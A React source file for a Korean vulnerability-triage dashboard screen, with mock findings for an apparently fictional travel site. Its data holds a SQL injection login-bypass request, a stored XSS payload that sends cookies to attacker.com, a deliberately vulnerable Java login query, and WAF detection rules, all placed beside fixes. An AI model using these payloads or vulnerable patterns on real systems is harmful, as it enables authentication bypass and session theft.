import { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  Shield, ChevronRight, ExternalLink, Terminal,
  CheckCircle2, Play, AlertTriangle, Bug, Cpu,
  Lock, Eye, RotateCcw, FileCode, Zap,
} from "lucide-react";
import { T } from "./tokens";

// ─────────────────────────────────────────
// 데이터
// ─────────────────────────────────────────

const VULNS = [
  {
    id: "W03", sev: "치명적", color: T.red, bg: T.redBg,
    title: "[KISA W-03] SQL 인젝션",
    endpoint: "POST /api/v1/users/login", epType: "REST",
    badge: "도달성 검증 완료", badgeColor: T.red, badgeBg: T.redBg,
    engine: "OWASP ZAP DAST", cvss: "9.8",
  },
  {
    id: "W19", sev: "높음", color: T.amber, bg: T.amberBg,
    title: "[KISA W-19] 크로스사이트 스크립팅 (XSS)",
    endpoint: "templates/profile.js:42", epType: "SRC",
    badge: "ISMS-P 2.10.2 기준", badgeColor: T.primary, badgeBg: T.primaryBg,
    engine: "Semgrep OSS SAST", cvss: "7.4",
  },
  {
    id: "W08", sev: "높음", color: T.amber, bg: T.amberBg,
    title: "[KISA W-08] 접근 제어 취약점 (IDOR)",
    endpoint: "GET /api/v1/bookings/{id}", epType: "REST",
    badge: "도달성 검증 완료", badgeColor: T.red, badgeBg: T.redBg,
    engine: "OWASP ZAP DAST", cvss: "7.1",
  },
  {
    id: "W14", sev: "중간", color: T.primary, bg: T.primaryBg,
    title: "[KISA W-14] 안전하지 않은 역직렬화",
    endpoint: "POST /api/v1/session/restore", epType: "REST",
    badge: "ISMS-P 2.9.1 기준", badgeColor: T.primary, badgeBg: T.primaryBg,
    engine: "Semgrep OSS SAST", cvss: "5.9",
  },
];

const SQL = {
  summary: "이 취약점은 여행 예약 플랫폼의 로그인 엔드포인트에서 발견된 SQL 인젝션 취약점입니다. 공격자는 username 파라미터에 악의적인 SQL 구문을 삽입하여 인증을 완전히 우회할 수 있으며, 전체 고객 데이터베이스(여권번호, 신용카드 정보, 예약 내역 포함)에 무단 접근이 가능합니다. CVSS 9.8로 즉각 패치가 필요하며, KISA W-03 기준에 따라 파라미터화된 쿼리를 반드시 사용해야 합니다.",
  pocReq: `POST /api/v1/users/login HTTP/1.1\nHost: argus-travel.com\nContent-Type: application/json\n\n{\n  "username": "admin'--",\n  "password": "anything"\n}`,
  pocRes: `HTTP/1.1 200 OK\n{\n  "status": "success",\n  "token": "eyJhbGc...",\n  "role": "ADMIN",\n  "message": "인증 우회 성공"\n}`,
  file: "src/controllers/AuthController.java", line: 87,
  vuln: `// ⚠️ 취약: SQL 쿼리에 문자열 직접 연결
public User authenticate(String username, String password) {
    String query = "SELECT * FROM users WHERE " +
        "username = '" + username + "' AND " +   // 87번 줄 ← 인젝션
        "password = '" + password + "'";
    return db.executeQuery(query);
}`,
  secure: `// ✅ 안전: KISA W-03 — 파라미터화된 쿼리
public User authenticate(String username, String password) {
    String query = "SELECT * FROM users WHERE " +
        "username = ? AND password = ?";
    PreparedStatement stmt = db.prepareStatement(query);
    stmt.setString(1, username);
    stmt.setString(2, hashPassword(password));
    return db.executeQuerySingle(stmt);
}`,
  waf: `# WAF 규칙 — KISA W-03 즉시 적용\nSecRule ARGS "@detectSQLi" \\\n    "id:942100, phase:2, block, \\\n     msg:'SQL 인젝션 공격 탐지', \\\n     severity:CRITICAL"`,
};

const XSS = {
  summary: "이 취약점은 사용자 프로필 렌더링 템플릿에서 발견된 저장형 XSS 취약점입니다. 공격자가 프로필에 악성 스크립트를 삽입하면 해당 프로필 조회자의 세션 쿠키를 탈취하거나 피싱 페이지로 리다이렉션할 수 있습니다. ISMS-P 2.10.2 출력값 인코딩 기준을 즉시 적용해야 합니다.",
  pocReq: `PUT /api/v1/users/profile HTTP/1.1\nHost: argus-travel.com\nContent-Type: application/json\n\n{\n  "displayName": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",\n  "bio": "여행자"\n}`,
  pocRes: `// 피해자 프로필 방문 시 실행:\ndocument.cookie → "session=eyJhbGc..."\n// 공격자 서버로 전송\nalert("XSS: 세션 탈취 성공!")`,
  file: "templates/profile.js", line: 42,
  vuln: `// ⚠️ 취약: 미정제 innerHTML 사용\nfunction renderProfile(user) {\n    const el = document.getElementById('profile');\n    el.innerHTML = \`\n        <h2>\${user.displayName}</h2>   // 42번 줄 ← XSS\n        <p>\${user.bio}</p>\n    \`;\n}`,
  secure: `// ✅ 안전: ISMS-P 2.10.2 — 출력값 인코딩\nfunction renderProfile(user) {\n    const el = document.getElementById('profile');\n    const esc = s => s.replace(/&/g,'&amp;')\n        .replace(/</g,'&lt;').replace(/>/g,'&gt;');\n    el.innerHTML = \`\n        <h2>\${esc(user.displayName)}</h2>\n        <p>\${esc(user.bio)}</p>\n    \`;\n}`,
  waf: `# WAF 규칙 — XSS 차단 (ISMS-P 2.10.2)\nSecRule ARGS "@rx <script[^>]*>" \\\n    "id:941100, phase:2, block, \\\n     msg:'XSS 공격 탐지', severity:HIGH"`,
};

// ─────────────────────────────────────────
// 공통 UI
// ─────────────────────────────────────────

function SectionCard({ icon: Icon, title, accent, accentBg, badge, children }: {
  icon: React.ElementType; title: string; accent: string; accentBg: string; badge?: string; children: React.ReactNode;
}) {
  return (
    <div style={{ background: T.surface, borderRadius: 12, border: `1.5px solid ${accent}22`, overflow: "hidden", boxShadow: "0 2px 10px rgba(0,0,0,0.04)" }}>
      <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "11px 16px", background: accentBg, borderBottom: `1px solid ${accent}18` }}>
        <Icon size={13} color={accent} />
        <span style={{ fontFamily: "Inter, sans-serif", fontSize: 12, fontWeight: 700, color: accent }}>{title}</span>
        {badge && <span style={{ marginLeft: "auto", fontFamily: "Inter, sans-serif", fontSize: 10, fontWeight: 600, color: accent, background: T.surface, padding: "2px 8px", borderRadius: 20, opacity: 0.8 }}>{badge}</span>}
      </div>
      <div style={{ padding: 14 }}>{children}</div>
    </div>
  );
}

function CodeBlock({ code, highlightLine }: { code: string; highlightLine?: number }) {
  const lines = code.split("\n");
  return (
    <div style={{ borderRadius: 8, overflow: "hidden", border: `1px solid ${T.border}` }}>
      <div style={{ display: "flex", gap: 5, padding: "7px 10px", background: T.bg, borderBottom: `1px solid ${T.border}` }}>
        {[T.red, T.amber, T.green].map(c => <div key={c} style={{ width: 9, height: 9, borderRadius: "50%", background: c, opacity: 0.45 }} />)}
      </div>
      <div style={{ overflowX: "auto", background: "#FAFBFF" }}>
        <table style={{ borderCollapse: "collapse", width: "100%" }}>
          <tbody>
            {lines.map((line, i) => {
              const hl = highlightLine !== undefined && i + 1 === highlightLine;
              return (
                <tr key={i} style={{ background: hl ? T.redBg : "transparent" }}>
                  <td style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 10, color: T.muted, padding: "1px 10px", userSelect: "none", width: 26, textAlign: "right", borderRight: `1px solid ${T.border}` }}>{i + 1}</td>
                  <td style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 10, color: hl ? T.red : "#334155", padding: "1px 12px", whiteSpace: "pre" }}>{line}</td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}

function DiffBlock({ vuln, secure }: { vuln: string; secure: string }) {
  return (
    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
      {[
        { label: "취약한 코드", code: vuln, accent: T.red, bg: "#FFF8F8", textColor: "#B91C1C", Icon: AlertTriangle },
        { label: "Argus 권고 코드 (SK쉴더스 기준)", code: secure, accent: T.green, bg: "#F5FFF8", textColor: "#14532D", Icon: CheckCircle2 },
      ].map(({ label, code, accent, bg, textColor, Icon }) => (
        <div key={label} style={{ borderRadius: 8, overflow: "hidden", border: `1.5px solid ${accent}25` }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", background: `${accent}10`, borderBottom: `1px solid ${accent}18` }}>
            <Icon size={11} color={accent} />
            <span style={{ fontFamily: "Inter, sans-serif", fontSize: 11, fontWeight: 600, color: accent }}>{label}</span>
          </div>
          <div style={{ overflowX: "auto", padding: 10, background: bg }}>
            <pre style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 10, color: textColor, margin: 0, whiteSpace: "pre-wrap", lineHeight: 1.65 }}>{code}</pre>
          </div>
        </div>
      ))}
    </div>
  );
}

function StepRow({ n, label, sub, color }: { n: number; label: string; sub?: string; color: string }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
      <div style={{ width: 24, height: 24, borderRadius: 7, background: color, display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "JetBrains Mono, monospace", fontSize: 11, fontWeight: 700, color: "#fff", flexShrink: 0 }}>{n}</div>
      <span style={{ fontFamily: "Inter, sans-serif", fontSize: 12, fontWeight: 700, color: T.text }}>{label}</span>
      {sub && <span style={{ fontFamily: "Inter, sans-serif", fontSize: 11, color: T.muted }}>{sub}</span>}
    </div>
  );
}

// ─────────────────────────────────────────
// 메인
// ─────────────────────────────────────────

export function TriageScreen() {
  const [sel, setSel] = useState(VULNS[0]);
  const [rerunning, setRerunning] = useState(false);
  const d = sel.id === "W03" ? SQL : XSS;

  return (
    <div style={{ display: "flex", flex: 1, overflow: "hidden", background: T.bg }}>

      {/* ── 좌측 피드 ── */}
      <div style={{ width: 310, flexShrink: 0, background: T.surface, borderRight: `1px solid ${T.border}`, display: "flex", flexDirection: "column", overflow: "hidden" }}>

        {/* 헤더 */}
        <div style={{ padding: "11px 14px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", justifyContent: "space-between", flexShrink: 0, background: T.bg }}>
          <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
            <Bug size={13} color={T.muted} />
            <span style={{ fontFamily: "Inter, sans-serif", fontSize: 13, fontWeight: 700, color: T.text }}>검증된 취약점</span>
          </div>
          <span style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 12, fontWeight: 700, color: T.green, background: T.greenBg, padding: "2px 8px", borderRadius: 6 }}>230</span>
        </div>

        {/* 필터 */}
        <div style={{ display: "flex", gap: 4, padding: "7px 10px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
          {["전체", "치명적", "높음", "중간"].map((f, i) => (
            <button key={f} style={{ padding: "4px 10px", borderRadius: 6, border: "none", cursor: "pointer", fontFamily: "Inter, sans-serif", fontSize: 11, fontWeight: i === 0 ? 600 : 400, color: i === 0 ? T.primary : T.muted, background: i === 0 ? T.primaryBg : "transparent" }}>
              {f}
            </button>
          ))}
        </div>

        {/* 카드 목록 */}
        <div style={{ flex: 1, overflowY: "auto", padding: 10, display: "flex", flexDirection: "column", gap: 7 }}>
          {VULNS.map(v => {
            const active = sel.id === v.id;
            return (
              <button key={v.id} onClick={() => setSel(v)} style={{
                textAlign: "left", borderRadius: 10, overflow: "hidden",
                border: `1.5px solid ${active ? v.color + "40" : T.border}`,
                background: active ? v.bg : T.surface,
                cursor: "pointer", position: "relative",
                boxShadow: active ? `0 3px 12px ${v.color}14` : "none",
                transition: "all 0.15s",
              }}>
                {/* 심각도 바 */}
                <div style={{ position: "absolute", left: 0, top: 0, bottom: 0, width: 3, background: v.color, borderRadius: "10px 0 0 10px" }} />
                <div style={{ padding: "11px 11px 11px 14px" }}>
                  <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 6, marginBottom: 6 }}>
                    <span style={{ fontFamily: "Inter, sans-serif", fontSize: 12, fontWeight: 600, color: T.text, lineHeight: 1.4 }}>{v.title}</span>
                    <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 2, flexShrink: 0 }}>
                      <span style={{ fontFamily: "Inter, sans-serif", fontSize: 10, fontWeight: 700, color: v.color, background: `${v.color}15`, padding: "1px 6px", borderRadius: 4 }}>{v.sev}</span>
                      <span style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 9, color: T.muted }}>CVSS {v.cvss}</span>
                    </div>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 5, marginBottom: 7 }}>
                    <span style={{ fontFamily: "Inter, sans-serif", fontSize: 9, fontWeight: 600, color: v.epType === "REST" ? T.blue : T.purple, background: v.epType === "REST" ? T.blueBg : T.purpleBg, padding: "1px 5px", borderRadius: 3 }}>{v.epType}</span>
                    <span style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 9, color: T.muted, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: 170 }}>{v.endpoint}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <span style={{ fontFamily: "Inter, sans-serif", fontSize: 9, fontWeight: 600, color: v.badgeColor, background: v.badgeBg, padding: "2px 7px", borderRadius: 20 }}>{v.badge}</span>
                    {active && <ChevronRight size={12} color={v.color} />}
                  </div>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* ── 우측 인스펙터 ── */}
      <div style={{ flex: 1, overflowY: "auto" }}>
        <AnimatePresence mode="wait">
          <motion.div key={sel.id}
            initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -6 }}
            transition={{ duration: 0.16 }}
            style={{ padding: 18, display: "flex", flexDirection: "column", gap: 12 }}
          >
            {/* 인스펙터 헤더 */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "14px 16px", background: T.surface, borderRadius: 12, border: `1px solid ${T.border}`, boxShadow: "0 2px 8px rgba(0,0,0,0.04)" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                <div style={{ width: 38, height: 38, borderRadius: 10, background: sel.bg, border: `1.5px solid ${sel.color}28`, display: "flex", alignItems: "center", justifyContent: "center" }}>
                  <Shield size={17} color={sel.color} />
                </div>
                <div>
                  <h2 style={{ fontFamily: "Inter, sans-serif", fontSize: 14, fontWeight: 700, color: T.text, margin: 0, lineHeight: 1.3 }}>{sel.title}</h2>
                  <div style={{ display: "flex", alignItems: "center", gap: 8, marginTop: 3 }}>
                    <span style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 11, color: T.muted }}>{sel.endpoint}</span>
                    <span style={{ fontFamily: "Inter, sans-serif", fontSize: 10, fontWeight: 700, color: sel.color, background: sel.bg, padding: "1px 7px", borderRadius: 4 }}>{sel.sev} · CVSS {sel.cvss}</span>
                  </div>
                </div>
              </div>
              <button style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 7, border: `1px solid ${T.border}`, background: T.bg, cursor: "pointer", fontFamily: "Inter, sans-serif", fontSize: 12, color: T.sub }}>
                <ExternalLink size={11} /> JIRA 이슈 생성
              </button>
            </div>

            {/* 섹션 A — AI 위험 요약 */}
            <SectionCard icon={Cpu} title="섹션 A — 맥락적 위험 요약" accent={T.primary} accentBg={T.primaryBg} badge="Claude AI 생성">
              <p style={{ fontFamily: "Inter, sans-serif", fontSize: 13, color: T.sub, lineHeight: 1.75, margin: 0 }}>{d.summary}</p>
            </SectionCard>

            {/* 섹션 B — Selenium PoC */}
            <SectionCard icon={Eye} title="섹션 B — Selenium 자동화 증거 캡처" accent={T.amber} accentBg={T.amberBg} badge="헤드리스 브라우저">
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
                {/* 요청 */}
                <div style={{ borderRadius: 8, overflow: "hidden", border: `1px solid ${T.border}` }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 11px", background: T.bg, borderBottom: `1px solid ${T.border}` }}>
                    <Terminal size={10} color={T.muted} />
                    <span style={{ fontFamily: "Inter, sans-serif", fontSize: 11, color: T.sub }}>PoC 요청 패킷</span>
                  </div>
                  <div style={{ padding: 10, background: "#FAFBFF" }}>
                    <pre style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 10, color: "#334155", margin: 0, lineHeight: 1.7, whiteSpace: "pre-wrap" }}>{d.pocReq}</pre>
                  </div>
                </div>
                {/* 응답 */}
                <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                  <div style={{ borderRadius: 8, overflow: "hidden", border: `1px solid ${T.border}`, flex: 1 }}>
                    <div style={{ display: "flex", gap: 5, alignItems: "center", padding: "6px 10px", background: T.bg, borderBottom: `1px solid ${T.border}` }}>
                      {[T.red, T.amber, T.green].map(c => <div key={c} style={{ width: 8, height: 8, borderRadius: "50%", background: c, opacity: 0.45 }} />)}
                      <div style={{ flex: 1, marginLeft: 5, padding: "1px 7px", borderRadius: 4, background: T.border, fontFamily: "JetBrains Mono, monospace", fontSize: 8, color: T.muted }}>argus-travel.com</div>
                    </div>
                    <div style={{ padding: 10, background: "#F6FFFB" }}>
                      <pre style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 9, color: "#14532D", margin: 0, lineHeight: 1.65 }}>{d.pocRes}</pre>
                    </div>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 7, padding: "7px 10px", borderRadius: 7, background: T.redBg }}>
                    <AlertTriangle size={10} color={T.red} />
                    <span style={{ fontFamily: "Inter, sans-serif", fontSize: 10, fontWeight: 500, color: T.red }}>익스플로잇 확인 — Selenium 자동 재연 성공</span>
                  </div>
                </div>
              </div>
            </SectionCard>

            {/* 섹션 C — 4단계 조치 */}
            <SectionCard icon={Lock} title="섹션 C — 4단계 조치 가이드" accent={T.green} accentBg={T.greenBg} badge="SK쉴더스 기준">
              <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
                {/* 1단계 */}
                <div style={{ padding: "12px 0", borderBottom: `1px solid ${T.border}` }}>
                  <StepRow n={1} label="즉시 조치" sub="— WAF 규칙 패치 (2시간 이내)" color={T.red} />
                  <CodeBlock code={d.waf} />
                </div>

                {/* 2단계 */}
                <div style={{ padding: "12px 0", borderBottom: `1px solid ${T.border}` }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                    <StepRow n={2} label="근본 원인" sub="— 소스코드 위치" color={T.amber} />
                    <div style={{ display: "flex", alignItems: "center", gap: 5, padding: "4px 9px", borderRadius: 6, background: T.bg, border: `1px solid ${T.border}` }}>
                      <FileCode size={10} color={T.muted} />
                      <span style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 10, color: T.sub }}>{d.file}</span>
                      <span style={{ fontFamily: "JetBrains Mono, monospace", fontSize: 10, color: T.red }}>:{d.line}</span>
                    </div>
                  </div>
                  <CodeBlock code={d.vuln} highlightLine={4} />
                </div>

                {/* 3단계 */}
                <div style={{ padding: "12px 0", borderBottom: `1px solid ${T.border}` }}>
                  <StepRow n={3} label="코드 수정" sub="— 취약 코드 vs 권고 코드 비교" color={T.green} />
                  <DiffBlock vuln={d.vuln} secure={d.secure} />
                </div>

                {/* 4단계 */}
                <div style={{ paddingTop: 12 }}>
                  <StepRow n={4} label="검증" sub="— 자동화 재연 테스트" color={T.primary} />
                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <button
                      onClick={() => { setRerunning(true); setTimeout(() => setRerunning(false), 2500); }}
                      style={{
                        display: "flex", alignItems: "center", gap: 7,
                        padding: "8px 18px", borderRadius: 8, border: `1.5px solid ${rerunning ? T.green + "40" : T.primary + "35"}`,
                        background: rerunning ? T.greenBg : T.primaryBg,
                        color: rerunning ? T.green : T.primary,
                        fontFamily: "Inter, sans-serif", fontSize: 12, fontWeight: 600,
                        cursor: rerunning ? "default" : "pointer",
                        boxShadow: rerunning ? "none" : `0 2px 8px ${T.primary}20`,
                      }}
                    >
                      {rerunning
                        ? <><motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1, ease: "linear" }}><RotateCcw size={12} /></motion.div> 검증 재실행 중...</>
                        : <><Play size={12} fill="currentColor" /> 자동화 재연 검증 재실행</>
                      }
                    </button>
                    {rerunning && (
                      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ display: "flex", alignItems: "center", gap: 6 }}>
                        <motion.div animate={{ opacity: [1, 0.3, 1] }} transition={{ repeat: Infinity, duration: 0.8 }}>
                          <Zap size={12} color={T.green} />
                        </motion.div>
                        <span style={{ fontFamily: "Inter, sans-serif", fontSize: 12, color: T.green }}>Selenium 헤드리스 재연 진행 중...</span>
                      </motion.div>
                    )}
                  </div>
                </div>
              </div>
            </SectionCard>
          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
}
